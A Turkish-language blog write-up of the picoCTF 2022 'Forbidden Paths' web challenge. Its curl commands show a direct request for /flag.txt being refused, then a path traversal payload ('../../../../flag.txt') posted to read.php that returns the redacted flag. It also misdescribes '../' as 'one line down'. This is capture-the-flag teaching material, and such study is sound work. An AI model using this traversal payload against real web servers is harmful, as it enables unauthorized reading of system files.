---
title: 'picoCTF 2022 | Forbidden Paths WriteUp'
author: appdone
categories: [picoCTF 2022 Challenges]
render_with_liquid: false
---

Bu yazıda, picoCTF platformunda yer alan "Forbidden Paths" isimli meydan okumayı çözeceğiz. Meydan okumanın açıklamasında, web sitesindeki  dosyaların /usr/share/nginx/html/ dizininde olduğu ve bayrağın /flag.txt dosyasında olduğu yazıyor.

```console
C:\Users\Appdone\Desktop>curl http://saturn.picoctf.net:55055
...
    <h1>Web eReader</h1>
    <p>..</p>
    <p>divine-comedy.txt</p>
    <p>oliver-twist.txt</p>
    <p>the-happy-prince.txt</p>

    <form role="form" action="read.php" method="post">
      <input type="text" name="filename" placeholder="Filename" required></br>
      <button type="submit" name="read">Read</button>
    </form>
...
```

Web uygulamasında, girilen dosyanın içeriğini başka bir sayfaya dahil eden bir form bulunuyor. Doğrudan /flag.txt olarak sayfaya dahil etmeye çalıştığımızda aşağıdaki hatayı alıyoruz.

```console
C:\Users\Appdone\Desktop>curl http://saturn.picoctf.net:55055/read.php -X POST -d "filename=/flag.txt"
...
Not Authorized
```

Web uygulamasının bulunduğu dizinin /usr/share/nginx/html/ olduğunu biliyoruz. Bu durumda başına "../" ifadesini kök dizine gelene kadar kullanırsak bir ihtimal bayrağın bulunduğu dosyayı görüntüleyebiliriz. "../" ifadesi bir alt satır demektir. bu ifadeyi yan yana 4 kez kullandığımızda kök dizine ulaşmış oluruz.

```console
C:\Users\Appdone\Desktop>curl http://saturn.picoctf.net:55055/read.php -X POST -d "filename=../../../../flag.txt"
...
picoCTF{***}
...
```
